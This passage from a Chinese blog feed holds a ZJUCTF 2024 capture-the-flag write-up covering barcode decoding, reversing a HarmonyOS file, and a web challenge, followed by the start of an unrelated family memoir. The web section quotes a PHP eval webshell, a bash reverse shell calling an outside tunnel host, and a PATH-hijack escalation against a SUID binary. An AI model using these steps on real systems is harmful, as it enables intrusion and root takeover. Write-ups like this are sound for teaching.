leng = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> last==color:<br>            leng+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            lis+=<span class="hljs-built_in">str</span>(leng)<br>            leng = <span class="hljs-number">1</span><br>            last = color<br>lis+=<span class="hljs-built_in">str</span>(leng)<br><span class="hljs-built_in">print</span>(lis,<span class="hljs-built_in">len</span>(lis)//<span class="hljs-number">6</span>)<br>code128b_dict = &#123;<br>    <span class="hljs-string">&#x27;212222&#x27;</span>: <span class="hljs-string">&#x27;SP&#x27;</span>,     <span class="hljs-comment"># 空格 (Space)</span><br>    <span class="hljs-string">&#x27;222122&#x27;</span>: <span class="hljs-string">&#x27;!&#x27;</span>,      <span class="hljs-comment"># !</span><br>    <span class="hljs-string">&#x27;222221&#x27;</span>: <span class="hljs-string">&#x27;&quot;&#x27;</span>,      <span class="hljs-comment"># &quot;</span><br>    <span class="hljs-string">&#x27;121223&#x27;</span>: <span class="hljs-string">&#x27;#&#x27;</span>,      <span class="hljs-comment"># #</span><br>    <span class="hljs-string">&#x27;121322&#x27;</span>: <span class="hljs-string">&#x27;$&#x27;</span>,      <span class="hljs-comment"># $</span><br>    <span class="hljs-string">&#x27;131222&#x27;</span>: <span class="hljs-string">&#x27;%&#x27;</span>,      <span class="hljs-comment"># %</span><br>    <span class="hljs-string">&#x27;122213&#x27;</span>: <span class="hljs-string">&#x27;&amp;&#x27;</span>,      <span class="hljs-comment"># &amp;</span><br>    <span class="hljs-string">&#x27;122312&#x27;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>,      <span class="hljs-comment"># &#x27;</span><br>    <span class="hljs-string">&#x27;132212&#x27;</span>: <span class="hljs-string">&#x27;(&#x27;</span>,      <span class="hljs-comment"># (</span><br>    <span class="hljs-string">&#x27;221213&#x27;</span>: <span class="hljs-string">&#x27;)&#x27;</span>,      <span class="hljs-comment"># )</span><br>    <span class="hljs-string">&#x27;221312&#x27;</span>: <span class="hljs-string">&#x27;*&#x27;</span>,      <span class="hljs-comment"># *</span><br>    <span class="hljs-string">&#x27;231212&#x27;</span>: <span class="hljs-string">&#x27;+&#x27;</span>,      <span class="hljs-comment"># +</span><br>    <span class="hljs-string">&#x27;112232&#x27;</span>: <span class="hljs-string">&#x27;,&#x27;</span>,      <span class="hljs-comment"># ,</span><br>    <span class="hljs-string">&#x27;122132&#x27;</span>: <span class="hljs-string">&#x27;-&#x27;</span>,      <span class="hljs-comment"># -</span><br>    <span class="hljs-string">&#x27;122231&#x27;</span>: <span class="hljs-string">&#x27;.&#x27;</span>,      <span class="hljs-comment"># .</span><br>    <span class="hljs-string">&#x27;113222&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>,      <span class="hljs-comment"># /</span><br>    <span class="hljs-string">&#x27;123122&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,      <span class="hljs-comment"># 0</span><br>    <span class="hljs-string">&#x27;123221&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,      <span class="hljs-comment"># 1</span><br>    <span class="hljs-string">&#x27;223211&#x27;</span>: <span class="hljs-string">&#x27;2&#x27;</span>,      <span class="hljs-comment"># 2</span><br>    <span class="hljs-string">&#x27;221132&#x27;</span>: <span class="hljs-string">&#x27;3&#x27;</span>,      <span class="hljs-comment"># 3</span><br>    <span class="hljs-string">&#x27;221231&#x27;</span>: <span class="hljs-string">&#x27;4&#x27;</span>,      <span class="hljs-comment"># 4</span><br>    <span class="hljs-string">&#x27;213212&#x27;</span>: <span class="hljs-string">&#x27;5&#x27;</span>,      <span class="hljs-comment"># 5</span><br>    <span class="hljs-string">&#x27;223112&#x27;</span>: <span class="hljs-string">&#x27;6&#x27;</span>,      <span class="hljs-comment"># 6</span><br>    <span class="hljs-string">&#x27;312131&#x27;</span>: <span class="hljs-string">&#x27;7&#x27;</span>,      <span class="hljs-comment"># 7</span><br>    <span class="hljs-string">&#x27;311222&#x27;</span>: <span class="hljs-string">&#x27;8&#x27;</span>,      <span class="hljs-comment"># 8</span><br>    <span class="hljs-string">&#x27;321122&#x27;</span>: <span class="hljs-string">&#x27;9&#x27;</span>,      <span class="hljs-comment"># 9</span><br>    <span class="hljs-string">&#x27;321221&#x27;</span>: <span class="hljs-string">&#x27;:&#x27;</span>,      <span class="hljs-comment"># :</span><br>    <span class="hljs-string">&#x27;312212&#x27;</span>: <span class="hljs-string">&#x27;;&#x27;</span>,      <span class="hljs-comment"># ;</span><br>    <span class="hljs-string">&#x27;322112&#x27;</span>: <span class="hljs-string">&#x27;&lt;&#x27;</span>,      <span class="hljs-comment"># &lt;</span><br>    <span class="hljs-string">&#x27;322211&#x27;</span>: <span class="hljs-string">&#x27;=&#x27;</span>,      <span class="hljs-comment"># =</span><br>    <span class="hljs-string">&#x27;212123&#x27;</span>: <span class="hljs-string">&#x27;&gt;&#x27;</span>,      <span class="hljs-comment"># &gt;</span><br>    <span class="hljs-string">&#x27;212321&#x27;</span>: <span class="hljs-string">&#x27;?&#x27;</span>,      <span class="hljs-comment"># ?</span><br>    <span class="hljs-string">&#x27;232121&#x27;</span>: <span class="hljs-string">&#x27;@&#x27;</span>,      <span class="hljs-comment"># @</span><br>    <span class="hljs-string">&#x27;111323&#x27;</span>: <span class="hljs-string">&#x27;A&#x27;</span>,      <span class="hljs-comment"># A</span><br>    <span class="hljs-string">&#x27;131123&#x27;</span>: <span class="hljs-string">&#x27;B&#x27;</span>,      <span class="hljs-comment"># B</span><br>    <span class="hljs-string">&#x27;131321&#x27;</span>: <span class="hljs-string">&#x27;C&#x27;</span>,      <span class="hljs-comment"># C</span><br>    <span class="hljs-string">&#x27;112313&#x27;</span>: <span class="hljs-string">&#x27;D&#x27;</span>,      <span class="hljs-comment"># D</span><br>    <span class="hljs-string">&#x27;132113&#x27;</span>: <span class="hljs-string">&#x27;E&#x27;</span>,      <span class="hljs-comment"># E</span><br>    <span class="hljs-string">&#x27;132311&#x27;</span>: <span class="hljs-string">&#x27;F&#x27;</span>,      <span class="hljs-comment"># F</span><br>    <span class="hljs-string">&#x27;211313&#x27;</span>: <span class="hljs-string">&#x27;G&#x27;</span>,      <span class="hljs-comment"># G</span><br>    <span class="hljs-string">&#x27;231113&#x27;</span>: <span class="hljs-string">&#x27;H&#x27;</span>,      <span class="hljs-comment"># H</span><br>    <span class="hljs-string">&#x27;231311&#x27;</span>: <span class="hljs-string">&#x27;I&#x27;</span>,      <span class="hljs-comment"># I</span><br>    <span class="hljs-string">&#x27;112133&#x27;</span>: <span class="hljs-string">&#x27;J&#x27;</span>,      <span class="hljs-comment"># J</span><br>    <span class="hljs-string">&#x27;112331&#x27;</span>: <span class="hljs-string">&#x27;K&#x27;</span>,      <span class="hljs-comment"># K</span><br>    <span class="hljs-string">&#x27;132131&#x27;</span>: <span class="hljs-string">&#x27;L&#x27;</span>,      <span class="hljs-comment"># L</span><br>    <span class="hljs-string">&#x27;113123&#x27;</span>: <span class="hljs-string">&#x27;M&#x27;</span>,      <span class="hljs-comment"># M</span><br>    <span class="hljs-string">&#x27;113321&#x27;</span>: <span class="hljs-string">&#x27;N&#x27;</span>,      <span class="hljs-comment"># N</span><br>    <span class="hljs-string">&#x27;133121&#x27;</span>: <span class="hljs-string">&#x27;O&#x27;</span>,      <span class="hljs-comment"># O</span><br>    <span class="hljs-string">&#x27;313121&#x27;</span>: <span class="hljs-string">&#x27;P&#x27;</span>,      <span class="hljs-comment"># P</span><br>    <span class="hljs-string">&#x27;211331&#x27;</span>: <span class="hljs-string">&#x27;Q&#x27;</span>,      <span class="hljs-comment"># Q</span><br>    <span class="hljs-string">&#x27;231131&#x27;</span>: <span class="hljs-string">&#x27;R&#x27;</span>,      <span class="hljs-comment"># R</span><br>    <span class="hljs-string">&#x27;213113&#x27;</span>: <span class="hljs-string">&#x27;S&#x27;</span>,      <span class="hljs-comment"># S</span><br>    <span class="hljs-string">&#x27;213311&#x27;</span>: <span class="hljs-string">&#x27;T&#x27;</span>,      <span class="hljs-comment"># T</span><br>    <span class="hljs-string">&#x27;213131&#x27;</span>: <span class="hljs-string">&#x27;U&#x27;</span>,      <span class="hljs-comment"># U</span><br>    <span class="hljs-string">&#x27;311123&#x27;</span>: <span class="hljs-string">&#x27;V&#x27;</span>,      <span class="hljs-comment"># V</span><br>    <span class="hljs-string">&#x27;311321&#x27;</span>: <span class="hljs-string">&#x27;W&#x27;</span>,      <span class="hljs-comment"># W</span><br>    <span class="hljs-string">&#x27;331121&#x27;</span>: <span class="hljs-string">&#x27;X&#x27;</span>,      <span class="hljs-comment"># X</span><br>    <span class="hljs-string">&#x27;312113&#x27;</span>: <span class="hljs-string">&#x27;Y&#x27;</span>,      <span class="hljs-comment"># Y</span><br>    <span class="hljs-string">&#x27;312311&#x27;</span>: <span class="hljs-string">&#x27;Z&#x27;</span>,      <span class="hljs-comment"># Z</span><br>    <span class="hljs-string">&#x27;332111&#x27;</span>: <span class="hljs-string">&#x27;[&#x27;</span>,      <span class="hljs-comment"># [</span><br>    <span class="hljs-string">&#x27;314111&#x27;</span>: <span class="hljs-string">&#x27;\\&#x27;</span>,     <span class="hljs-comment"># \</span><br>    <span class="hljs-string">&#x27;221411&#x27;</span>: <span class="hljs-string">&#x27;]&#x27;</span>,      <span class="hljs-comment"># ]</span><br>    <span class="hljs-string">&#x27;431111&#x27;</span>: <span class="hljs-string">&#x27;^&#x27;</span>,      <span class="hljs-comment"># ^</span><br>    <span class="hljs-string">&#x27;111224&#x27;</span>: <span class="hljs-string">&#x27;_&#x27;</span>,      <span class="hljs-comment"># _</span><br>    <span class="hljs-string">&#x27;111422&#x27;</span>: <span class="hljs-string">&#x27;`&#x27;</span>,      <span class="hljs-comment"># `</span><br>    <span class="hljs-string">&#x27;121124&#x27;</span>: <span class="hljs-string">&#x27;a&#x27;</span>,      <span class="hljs-comment"># a</span><br>    <span class="hljs-string">&#x27;121421&#x27;</span>: <span class="hljs-string">&#x27;b&#x27;</span>,      <span class="hljs-comment"># b</span><br>    <span class="hljs-string">&#x27;141122&#x27;</span>: <span class="hljs-string">&#x27;c&#x27;</span>,      <span class="hljs-comment"># c</span><br>    <span class="hljs-string">&#x27;141221&#x27;</span>: <span class="hljs-string">&#x27;d&#x27;</span>,      <span class="hljs-comment"># d</span><br>    <span class="hljs-string">&#x27;112214&#x27;</span>: <span class="hljs-string">&#x27;e&#x27;</span>,      <span class="hljs-comment"># e</span><br>    <span class="hljs-string">&#x27;112412&#x27;</span>: <span class="hljs-string">&#x27;f&#x27;</span>,      <span class="hljs-comment"># f</span><br>    <span class="hljs-string">&#x27;122114&#x27;</span>: <span class="hljs-string">&#x27;g&#x27;</span>,      <span class="hljs-comment"># g</span><br>    <span class="hljs-string">&#x27;122411&#x27;</span>: <span class="hljs-string">&#x27;h&#x27;</span>,      <span class="hljs-comment"># h</span><br>    <span class="hljs-string">&#x27;142112&#x27;</span>: <span class="hljs-string">&#x27;i&#x27;</span>,      <span class="hljs-comment"># i</span><br>    <span class="hljs-string">&#x27;142211&#x27;</span>: <span class="hljs-string">&#x27;j&#x27;</span>,      <span class="hljs-comment"># j</span><br>    <span class="hljs-string">&#x27;241211&#x27;</span>: <span class="hljs-string">&#x27;k&#x27;</span>,      <span class="hljs-comment"># k</span><br>    <span class="hljs-string">&#x27;221114&#x27;</span>: <span class="hljs-string">&#x27;l&#x27;</span>,      <span class="hljs-comment"># l</span><br>    <span class="hljs-string">&#x27;413111&#x27;</span>: <span class="hljs-string">&#x27;m&#x27;</span>,      <span class="hljs-comment"># m</span><br>    <span class="hljs-string">&#x27;241112&#x27;</span>: <span class="hljs-string">&#x27;n&#x27;</span>,      <span class="hljs-comment"># n</span><br>    <span class="hljs-string">&#x27;134111&#x27;</span>: <span class="hljs-string">&#x27;o&#x27;</span>,      <span class="hljs-comment"># o</span><br>    <span class="hljs-string">&#x27;111242&#x27;</span>: <span class="hljs-string">&#x27;p&#x27;</span>,      <span class="hljs-comment"># p</span><br>    <span class="hljs-string">&#x27;121142&#x27;</span>: <span class="hljs-string">&#x27;q&#x27;</span>,      <span class="hljs-comment"># q</span><br>    <span class="hljs-string">&#x27;121241&#x27;</span>: <span class="hljs-string">&#x27;r&#x27;</span>,      <span class="hljs-comment"># r</span><br>    <span class="hljs-string">&#x27;114212&#x27;</span>: <span class="hljs-string">&#x27;s&#x27;</span>,      <span class="hljs-comment"># s</span><br>    <span class="hljs-string">&#x27;124112&#x27;</span>: <span class="hljs-string">&#x27;t&#x27;</span>,      <span class="hljs-comment"># t</span><br>    <span class="hljs-string">&#x27;124211&#x27;</span>: <span class="hljs-string">&#x27;u&#x27;</span>,      <span class="hljs-comment"># u</span><br>    <span class="hljs-string">&#x27;411212&#x27;</span>: <span class="hljs-string">&#x27;v&#x27;</span>,      <span class="hljs-comment"># v</span><br>    <span class="hljs-string">&#x27;421112&#x27;</span>: <span class="hljs-string">&#x27;w&#x27;</span>,      <span class="hljs-comment"># w</span><br>    <span class="hljs-string">&#x27;421211&#x27;</span>: <span class="hljs-string">&#x27;x&#x27;</span>,      <span class="hljs-comment"># x</span><br>    <span class="hljs-string">&#x27;212141&#x27;</span>: <span class="hljs-string">&#x27;y&#x27;</span>,      <span class="hljs-comment"># y</span><br>    <span class="hljs-string">&#x27;214121&#x27;</span>: <span class="hljs-string">&#x27;z&#x27;</span>,      <span class="hljs-comment"># z</span><br>    <span class="hljs-string">&#x27;412121&#x27;</span>: <span class="hljs-string">&#x27;&#123;&#x27;</span>,      <span class="hljs-comment"># &#123;</span><br>    <span class="hljs-string">&#x27;111143&#x27;</span>: <span class="hljs-string">&#x27;|&#x27;</span>,      <span class="hljs-comment"># |</span><br>    <span class="hljs-string">&#x27;111341&#x27;</span>: <span class="hljs-string">&#x27;&#125;&#x27;</span>,      <span class="hljs-comment"># &#125;</span><br>    <span class="hljs-string">&#x27;131141&#x27;</span>: <span class="hljs-string">&#x27;~&#x27;</span>,      <span class="hljs-comment"># ~</span><br>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(lis),<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">print</span>(code128b_dict[lis[i:i+<span class="hljs-number">6</span>]],end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/32.png"></p></li><li><p>用条形码解出的信息解析base36，得到flag: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">indexes = <span class="hljs-string">&#x27;ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789&#x27;</span><br>res = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp:<br>    res = res*<span class="hljs-number">36</span>+indexes.index(i)<br><br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><span class="hljs-built_in">print</span>(n2s(res))<br><br><span class="hljs-comment"># ZJUCTF&#123;A_13G3nd4Ry_4h0uR-T3l36r4Phls7XD&#125;</span><br></code></pre></td></tr></table></figure></p></li></ul><h2 id="cba">CBA</h2><ul><li>根据出题人给的hint，<code>reverse the CBA and you will get an ABC.</code>猜测他给的附件是一个鸿蒙abc文件倒过来，写个脚本得到文件（开头确实是<code>PANDA</code>文件头）： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;cba&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>new = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.abc&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.read()[::-<span class="hljs-number">1</span>]:<br>    tmp = <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>    tmp = <span class="hljs-built_in">int</span>(tmp[::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>)<br>    new.write(<span class="hljs-built_in">bytes</span>([tmp]))<br></code></pre></td></tr></table></figure></li><li>用工具逆向abc文件，发现main定义了一堆字符串，每个字符串倒过来就是app的一些函数，根据变量名编号连起来，发现是一串绘图的代码： <img src="/img/zjuctf2024/41.png"> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>lis = [<span class="hljs-number">0</span>]*<span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    tmp = f.readline()<br>    tmp = tmp.replace(<span class="hljs-string">&quot;\\n&quot;</span>,<span class="hljs-string">&quot;\n&quot;</span>)<br>    indexs = <span class="hljs-built_in">int</span>(tmp[tmp.index(<span class="hljs-string">&quot;part&quot;</span>)+<span class="hljs-number">4</span>:tmp.index(<span class="hljs-string">&quot; =&quot;</span>)])<br>    lis[indexs] = tmp[tmp.index(<span class="hljs-string">&#x27;&quot;&#x27;</span>)+<span class="hljs-number">1</span>:-<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>]<br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lis[::-<span class="hljs-number">1</span>]:<br>    res+=i<br>new = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>new.write(res)<br><span class="hljs-comment"># print(res)</span><br></code></pre></td></tr></table></figure> res.txt开头长这样： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Column() &#123;<br>Row() &#123; &#125;.width(<span class="hljs-string">&#x27;100%&#x27;</span>).height(<span class="hljs-string">&#x27;6%&#x27;</span>)<br>Row() &#123;<br>    Column() &#123; &#125;.width(<span class="hljs-string">&#x27;1%&#x27;</span>).height(<span class="hljs-string">&#x27;100%&#x27;</span>).backgroundColor(<span class="hljs-string">&#x27;#000000&#x27;</span>)<br>    Column() &#123; &#125;.width(<span class="hljs-string">&#x27;1%&#x27;</span>).height(<span class="hljs-string">&#x27;100%&#x27;</span>).backgroundColor(<span class="hljs-string">&#x27;#efefef&#x27;</span>)<br>    Column() &#123; &#125;.width(<span class="hljs-string">&#x27;1%&#x27;</span>).height(<span class="hljs-string">&#x27;100%&#x27;</span>).backgroundColor(<span class="hljs-string">&#x27;#f8f8f8&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li>根据这个绘制的颜色编写脚本，手动绘制得到flag： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;res.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><br>img = []<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    line = line.strip()<br>    <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&quot;Column() &#123; &#125;.width(&#x27;1%&#x27;).hei&quot;</span>):<br>        color = line.index(<span class="hljs-string">&#x27;#&#x27;</span>)<br>        color = line[color+<span class="hljs-number">1</span>:color+<span class="hljs-number">7</span>]<br>        <span class="hljs-keyword">if</span> color == <span class="hljs-string">&#x27;000000&#x27;</span>:<br>            img.append(<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img.append(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(img)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(img[i])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(img[i], end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># ZJUCTF&#123;you_are_good_at_reverse_engineering&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/42.png"> 只弄了黑白双色所以很丑，原图应该挺炫酷的qaq</li></ul><h2 id="hint">hint</h2><ul><li>通过upload获得入口点，是一个webshell，<code>&lt;?php @eval($_POST['ZJUCTF&#123;Ye5_We1l_inj3C.t10N!!&#125;']);</code>，尝试用蚁🗡连接，发现并不行;</li><li>后来搭建本地环境，尝试用post方法传参，发现它把<code>.</code>解析成<code>_</code>了： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ZJUCTF&#123;Ye5_We1l_inj3C.t10N!!&#125;&#x27;</span>];<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$_POST</span>);<br></code></pre></td></tr></table></figure></li><li>去网上搜发现一个<a href="https://blog.csdn.net/mochu7777777/article/details/115050295">博客</a>，把前面两个下划线改一个中括号就可以了,接下来就是一个正常的反弹shell，用<code>system("bash -c 'bash -i &gt;&amp;/dev/tcp/23.tcp.cpolar.top/10161 0&gt;&amp;1'");</code>: <img src="/img/zjuctf2024/51.png"> <img src="/img/zjuctf2024/52.png"></li><li>我们需要读取到<code>/root</code>文件夹下的flag，说明是一道提权的题目，查看<code>find / -perm -u=s -type f 2&gt;/dev/null</code>发现一个有端倪的程序<code>/opt/hint</code>，用蚁🗡下载文件，反编译入下: <img src="/img/zjuctf2024/54.png"> <img src="/img/zjuctf2024/53.png"></li><li>发现程序一开始重设了环境变量，就不能通过动态链接库劫持程序来提权了，但是发现程序执行了<code>system("You are kidding")</code>，根据<a href="https://blog.csdn.net/nicai321/article/details/122275160">博客</a>通过如下操作可以提权，拿到flag: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;/bin/bash&quot; &gt; /tmp/You<br>chmod 777 /tmp/You<br>export PATH=/tmp:$PATH<br>cd /opt<br>./hint<br></code></pre></td></tr></table></figure> 输入非0和非1的数字即可(ZJUCTF{Don't_u_liKe_Th3_h1n7???}): <img src="/img/zjuctf2024/55.png"></li></ul><h1 id="总结"><strong>总结</strong></h1><p>一个星期打下来人都神志不清了🫠🫠🫠 <img src="/img/zjuctf2024/result.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF writeup</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如果生命没有终点</title>
    <link href="/2023/03/18/%E5%A6%82%E6%9E%9C%E7%94%9F%E5%91%BD%E6%B2%A1%E6%9C%89%E7%BB%88%E7%82%B9/"/>
    <url>/2023/03/18/%E5%A6%82%E6%9E%9C%E7%94%9F%E5%91%BD%E6%B2%A1%E6%9C%89%E7%BB%88%E7%82%B9/</url>
    
    <content type="html"><![CDATA[    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-138c0475" role="button" aria-expanded="false" aria-controls="collapse-138c0475">        <div class="fold-arrow">▶</div>前言      </div>      <div class="fold-collapse collapse" id="collapse-138c0475">        <div class="fold-content">          <p>补一下我的成名之作（bushi），发在<a href="https://www.jianshu.com/p/5e4885b0d93b">简书-如果生命没有终点</a>。</p>        </div>      </div>    </div><h1 id="正文">正文</h1><p>在爷爷被诊断出肝癌的那年，我才十二岁。</p><p>像这个年龄段的小孩，关于长辈的病情是万万听不得的，小孩子若是听了，就怕他一知半解，到处乱嚷嚷。于是，每当大夫抽空到我家喝杯茶的时候，我就会被支使着去姑姑家拿瓶酱油来，或是一块手帕，一根唇膏，各种琐碎的生活用品。我偶尔懒了、乏了，撒着娇不肯出去时，她们就把我安排到爷爷的房间里——这等秘密，爷爷也是不让听的。一想到爷爷都被如此对待，我那因好奇而蠢蠢欲动的心也就安分了下来。</p><p>爷爷就坐在咯吱咯吱响的摇椅上，两眼望着窗外，甚至不会因我的到来而改变视线。我呢，搬张凳子坐在茶几前，摆弄着桌上仅有的几样小玩意，发挥起自己的想象力来。那《唐诗鉴赏词典》是架航母，面巾纸是飞机，棉签是士兵，几粒抗病毒胶囊是炮弹，而敌人就是坐在摇椅上那位。我一手托着面巾纸，上下嘴唇震动发出飞机的轰鸣声，另一只手攥着几粒胶囊就往敌人身上扔。“进攻！”我大喊。敌人很明显溃不成军，他小心翼翼地把跌落在地的“炮弹”拾起来，拿眼把我一瞪，就没了下文。</p><p>炮弹扔光了，我就老老实实地趴在床边，数着树上的麻雀。院子里有三棵树，两棵是我们搬来前就有的，还有一棵长寿树苗，就种在花坛正中央，刚抽出几颗新芽。</p><p>一个人呆久了，自然就会说些傻话，至少我是这么认为的。爷爷就是这样，经常蹦出几句什么“岁月不饶人”，我不懂，问他他也不回答。若是回答了，也是叽里咕噜一大堆话，还是听不懂。末了，我干脆就不问。这下爷爷不满意了，见我不说话，他就反过来问我问题。</p><p>“毛毛，在看什么呢？”</p><p>对于一个孩子来说，世界上最值得兴奋之事莫过于拥有一位愿意听你稀奇古怪想象的听众了。我就会跟爷爷讲，院子里这棵樟树是爸爸，那棵柳树是妈妈，我是那棵小树苗，他们为我遮风挡雨，呵护我长大……</p><p>“那你爷爷是什么呢？”</p><p>“爷爷嘛……”我把眼睛转了转，嗤嗤地笑着，“爷爷是那挂在墙头黑不溜秋的老铁锹！”</p><p>“你这臭小子！”他作势把眼睛一瞪，装着要打我的样子，“晚上不给你炖丸子吃了！”</p><p>“别啊，爷爷！我知道爷爷最好了！”</p><p>我们在房间里闹着，大人们在客厅里聊着。里面是热火朝天，外面是严肃沉闷。等我闹累了，安静地趴在爷爷怀里的时候，大人们的秘密就会从窗沿边、门缝中飘进来，驱赶走仍在空中充斥着的欢乐气氛。我毕竟只是个孩子，自然听不懂什么叫“病变癌细胞”“肝移植”，但我因能知道这些秘密而自豪——知道这些秘密就是个大人了，不是吗？于是我费力地听着，模仿爷爷蹙起眉头，一边又点点头装作自己听懂了。可没过多久我又被窗外的蜻蜓勾走了魂。</p><p>那时我还不知道爷爷的肝癌已经步入了晚期，平时吃的胶囊已经难堪大用，而肝移植的费用对于我家来说是一个天价。我只知道爷爷再也没法起床给我炖丸子吃了。他整日整夜地躺在床上，妈妈端给他的稀饭他没吃几口就会放下。我经常看到他捂着肚子的右上侧，在床上翻来覆去，面色扭曲。等他发觉我在看他时，他就会尴尬地笑笑，装作什么也没发生，可那球成一团的被单与他额头上的汗珠证明我没有看错。这些片段式的情景在我的脑海里反复重组、拼接成一个模糊的概念：爷爷患了肝癌，这是种很痛的病。</p><p>自从爷爷的病情恶化以后，大夫就不怎么来了。他建议我们送老人家住院，但看到我爸妈脸上为难的神情，就没有多说什么。我倒是经常往爷爷的房间跑，想着法子逗他开心——到后来他看到我走进房间都会不自主地笑两声。</p><p>爷爷最终还是垮了。几个白大褂把他从房间里抬出来，他手里牢牢攥着被单，被单在地上蹭了一身灰。我躲在父母身后一脸畏惧地看着，那蜷缩着的身影在担架上一上一下地颠簸，就像海上的一片叶子，浪花一卷，就被无尽的黑暗吞没。</p><p>一个白大褂朝我们走来，我下意识地往后退了退。“还有呼吸，只是……”那个人没有再说下去，但把两根食指搭在一起，比了个“十”的手势。爸妈心照不宣地点点头，而我也在那个手势中嗅出了危险的气味。</p><p>住院费是姑姑付的。这几年来爷爷一直住在我家，姑姑一个人在外边潇洒，没有尽到赡养的义务。若是到了这个时候还不出把力，恐怕是要被别人说闲话的。姑姑不怕爷爷的冷眼与指责，不怕天，不怕地，就怕邻居朋友对她指指点点。于是乎，她甚至打包行李跑来我们家住，就为了离医院近些。</p><p>爷爷不在家的那段时间，我就坐在那把摇椅上，什么时候院子里那把铁锹被风吹倒了，我会跑过去把它扶起来。爸妈曾屡次跟我暗示，十天后爷爷就会去一个地方度假，可这只是大人们的说辞。我知道，爷爷要面对的东西叫死亡：失去对肉体的控制，失去思想，失去灵魂，抛下一切，堕入黑暗。虽然我很难想象这一切代